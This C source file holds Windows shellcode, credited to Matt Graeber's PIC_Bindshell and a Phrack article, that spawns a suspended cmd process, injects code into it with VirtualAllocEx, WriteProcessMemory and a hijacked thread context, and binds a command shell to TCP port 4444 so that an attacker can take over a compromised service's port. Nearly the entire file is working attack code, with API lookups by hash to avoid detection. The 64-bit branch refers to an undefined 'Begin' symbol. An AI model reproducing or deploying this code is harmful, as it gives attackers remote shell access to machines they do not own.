/* This code is based on the work of Matt Graeber and SK Chong. 

I used Matt Graeber's PIC_BindShell for the bindshell code. His original work can be located here:
 - https://github.com/mattifestation/PIC_Bindshell

I used SK Chongs work from his article in Phrack issue 62 phile 7 entitled: "History and Advances in Windows Shellcode"
 - http://www.phrack.org/archives/issues/62/7.txt

 This code will spawn a new process in a suspended state and inject the bind shellcode into it. Once the injection is completed
 the new suspended process will be resumed. SK Chong refered to this method as rebinding. The idea is that the vulnerable process
 is running behind a firewall that only permits specific ports to be used. This method is designed to take the place of the original 
 service and bind to the permitted port.
*/

#define WIN32_LEAN_AND_MEAN // sure is Matt! ;)

#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'

#include "GetProcAddressWithHash.h"
#include "64BitHelper.h"
#include <windows.h>
#include <winsock2.h>
#include <intrin.h>
#include <winnt.h>

#define BIND_PORT 4444
#define HTONS(x) (((((USHORT)(x)) >> 8) & 0xff) | ((((USHORT)(x)) & 0xff) << 8 ))

// Redefine Win32 function signatures.

typedef HMODULE(WINAPI *FuncLoadLibraryA) (
	_In_z_	LPSTR lpFileName
	);

typedef int (WINAPI *FuncWsaStartup) (
	_In_	WORD wVersionRequested,
	_Out_	LPWSADATA lpWSAData
	);

typedef SOCKET(WINAPI *FuncWsaSocketA) (
	_In_		int af,
	_In_		int type,
	_In_		int protocol,
	_In_opt_	LPWSAPROTOCOL_INFO lpProtocolInfo,
	_In_		GROUP g,
	_In_		DWORD dwFlags
	);

typedef int	(WINAPI *FuncBind) (
	_In_		SOCKET s,
	_In_		const struct sockaddr *name,
	_In_		int namelen
	);

typedef int	(WINAPI *FuncListen) (
	_In_		SOCKET s,
	_In_		int backlog
	);

typedef SOCKET(WINAPI *FuncAccept) (
	_In_		SOCKET s,
	_Out_opt_	struct sockaddr *addr,
	_Inout_opt_	int *addrlen
	);

typedef int (WINAPI *FuncCloseSocket) (
	_In_		SOCKET s
	);

typedef BOOL(WINAPI *FuncCreateProcess) (
	_In_opt_	LPCTSTR lpApplicationName,
	_Inout_opt_	LPTSTR lpCommandLin,
	_In_opt_	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_		BOOL bInheritHandles,
	_In_		DWORD dwCreationFlags,
	_In_opt_	LPVOID lpEnvironment,
	_In_opt_	LPCTSTR lpCurrentDirectory,
	_In_		LPSTARTUPINFO lpStartupInfo,
	_Out_		LPPROCESS_INFORMATION lpProcessInformation
	);

typedef DWORD(WINAPI *FuncWaitForSingleObject) (
	_In_		HANDLE hHandle,
	_In_		DWORD dwMilliseconds
	);

typedef BOOL(WINAPI *FuncGetThreadContext) (
	_In_		HANDLE hThread,
	_Inout_		LPCONTEXT lpContext
	);

typedef LPVOID(WINAPI *FuncVirutalAllocEx) (
	_In_		HANDLE hProcess,
	_In_opt_	LPVOID lpAddress,
	_In_		SIZE_T dwSize,
	_In_		DWORD flAllocationType,
	_In_		DWORD flProtect
	);

typedef BOOL(WINAPI *FuncWriteProcessMemory) (
	_In_		HANDLE hProcess,
	_In_		LPVOID lpBaseAddress,
	_In_		LPCVOID lpBuffer,
	_In_		SIZE_T nSize,
	_Out_		SIZE_T *lpNumberOfBytesWritten
	);

typedef BOOL(WINAPI *FuncSetThreadContext) (
	_In_		HANDLE hThread,
	_In_		const CONTEXT *lpContext
	);

typedef DWORD(WINAPI *FuncResumeThread) (
	_In_		HANDLE hThread
	);

typedef HANDLE(WINAPI *FuncGetCurrentProcess)(VOID);

typedef BOOL(WINAPI *FuncTerminateProcess) (
	_In_		HANDLE hProcess,
	_In_		UINT uExitCode
	);

VOID ExecutePayload(VOID);
VOID forkProcess(VOID);
VOID StartHere(VOID);

//VOID StartHere(VOID)
//{
//	forkProcess();
//	ExecutePayload();
//}

VOID ExecutePayload(VOID)
{
	FuncLoadLibraryA MyLoadLibraryA;
	FuncWsaStartup MyWsaStartup;
	FuncWsaSocketA MyWsaSocketA;
	FuncBind MyBind;
	FuncListen MyListen;
	FuncAccept MyAccept;
	FuncCloseSocket MyCloseSocket;
	FuncCreateProcess MyCreateProcessA;
	FuncWaitForSingleObject MyWaitForSingleObject;
	WSADATA WSAData;
	SOCKET s;
	SOCKET AcceptedSocket;
	struct sockaddr_in service;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;

	// Declare strings
	char cmdline[] = { 'c', 'm', 'd', 0 };
	char module[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };

	// Initialize Structures
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

#pragma warning(push)
#pragma warning ( disable : 4055 ) // Ignore cast warnings

	MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressWithHash(0x726774C);

	// Load ws2_32.dll
	MyLoadLibraryA((LPTSTR)module);

	// Locate required APIs
	MyWsaStartup = (FuncWsaStartup)GetProcAddressWithHash(0x006B8029);
	MyWsaSocketA = (FuncWsaSocketA)GetProcAddressWithHash(0xE0DF0FEA);
	MyBind = (FuncBind)GetProcAddressWithHash(0x6737DBC2);
	MyListen = (FuncListen)GetProcAddressWithHash(0xFF38E9B7);
	MyAccept = (FuncAccept)GetProcAddressWithHash(0xE13BEC74);
	MyCloseSocket = (FuncCloseSocket)GetProcAddressWithHash(0x614D6E75);
	MyCreateProcessA = (FuncCreateProcess)GetProcAddressWithHash(0x863FCC79);
	MyWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressWithHash(0x601D8708);
#pragma warning( pop )

	MyWsaStartup(MAKEWORD(2, 2), &WSAData);
	s = MyWsaSocketA(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = 0; // Bind to 0.0.0.0
	service.sin_port = HTONS(BIND_PORT);

	MyBind(s, (SOCKADDR *)&service, sizeof(service));
	MyListen(s, 0);
	AcceptedSocket = MyAccept(s, NULL, NULL);
	MyCloseSocket(s);

	StartupInfo.hStdError = (HANDLE)AcceptedSocket;
	StartupInfo.hStdOutput = (HANDLE)AcceptedSocket;
	StartupInfo.hStdInput = (HANDLE)AcceptedSocket;
	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.cb = 68;

	MyCreateProcessA(0, (LPTSTR)cmdline, 0, 0, TRUE, 0, 0, 0, &StartupInfo, &ProcessInformation);
	MyWaitForSingleObject(ProcessInformation.hProcess, INFINITE);
}

VOID forkProcess(VOID)
{
	FuncCreateProcess MyCreateProcessA;
	FuncGetThreadContext MyGetThreadContext;
	FuncVirutalAllocEx MyVirtualAllocEx;
	FuncWriteProcessMemory MyWriteProcessMemory;
	FuncSetThreadContext MySetThreadContext;
	FuncResumeThread MyResumeThread;
	FuncGetCurrentProcess MyGetCurrentProcess;
	FuncTerminateProcess MyTerminateProcess;
	FuncLoadLibraryA MyLoadLibraryA;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	CONTEXT ctx;
	LPVOID memBaseAddress;
	HANDLE currentHandle;

	// Declare strings
	char cmdline[] = { 'c', 'm', 'd', 0 };

	// Initialize Structures
	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	SecureZeroMemory(&ProcessInformation, sizeof(ProcessInformation));
	SecureZeroMemory(&ctx, sizeof(ctx));

#pragma warning(push)
#pragma warning ( disable : 4055 ) // Ignore cast warnings

	MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressWithHash(0x726774C);

	// Load required APIs
	MyCreateProcessA = (FuncCreateProcess)GetProcAddressWithHash(0x863FCC79);
	MyGetThreadContext = (FuncGetThreadContext)GetProcAddressWithHash(0xD1425C18);
	MyVirtualAllocEx = (FuncVirutalAllocEx)GetProcAddressWithHash(0x3F9287AE);
	MyWriteProcessMemory = (FuncWriteProcessMemory)GetProcAddressWithHash(0xE7BDD8C5);
	MySetThreadContext = (FuncSetThreadContext)GetProcAddressWithHash(0xD14E5C18);
	MyResumeThread = (FuncResumeThread)GetProcAddressWithHash(0x8EF4092B);
	MyGetCurrentProcess = (FuncGetCurrentProcess)GetProcAddressWithHash(0x51E2F352);
	MyTerminateProcess = (FuncTerminateProcess)GetProcAddressWithHash(0x5ECADC87);

	// Create suspended process
	MyCreateProcessA(0, cmdline, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &StartupInfo, &ProcessInformation);

	// Get thread context
	ctx.ContextFlags = CONTEXT_FULL;
	MyGetThreadContext(ProcessInformation.hThread, &ctx);

	// Create space on the stack for the return address
#if defined(_WIN64)
	ctx.Rsp -= sizeof(DWORD);

	// Write current EIP to the stack
	MyWriteProcessMemory(ProcessInformation.hProcess, (LPVOID)ctx.Rsp, (LPCVOID)ctx.Rip, sizeof(DWORD), NULL);

	// Allocate memory in the new process
	memBaseAddress = MyVirtualAllocEx(ProcessInformation.hProcess, 0, (DWORD64)forkProcess - (DWORD64)Begin, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Write ExploitFunction to suspended process
	MyWriteProcessMemory(ProcessInformation.hProcess, memBaseAddress, (LPCVOID)Begin, (DWORD64)forkProcess - (DWORD64)Begin, 0);

	// Setup CONTEXT
	ctx.ContextFlags = CONTEXT_FULL;

	// Set EIP to new shellcode location
	ctx.Rip = (DWORD64)memBaseAddress;
#else
	ctx.Esp -= sizeof(DWORD);

	// Write current EIP to the stack
	MyWriteProcessMemory(ProcessInformation.hProcess, (LPVOID)ctx.Esp, (LPCVOID)ctx.Eip, sizeof(DWORD), NULL);

	// Allocate memory in the new process
	memBaseAddress = MyVirtualAllocEx(ProcessInformation.hProcess, 0, (DWORD)forkProcess - (DWORD)ExecutePayload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Write ExploitFunction to suspended process
	MyWriteProcessMemory(ProcessInformation.hProcess, memBaseAddress, (LPCVOID)ExecutePayload, (DWORD)forkProcess - (DWORD)ExecutePayload, 0);

	// Setup CONTEXT
	ctx.ContextFlags = CONTEXT_FULL;

	// Set EIP to new shellcode location
	ctx.Eip = (DWORD)memBaseAddress;
#endif

	// Set the thread context
	MySetThreadContext(ProcessInformation.hThread, &ctx);

	// Resume the thread
	MyResumeThread(ProcessInformation.hThread);

	// Get Current process Handle
	currentHandle = MyGetCurrentProcess();

	// Terminate this process
	MyTerminateProcess(currentHandle, (UINT)-1);
}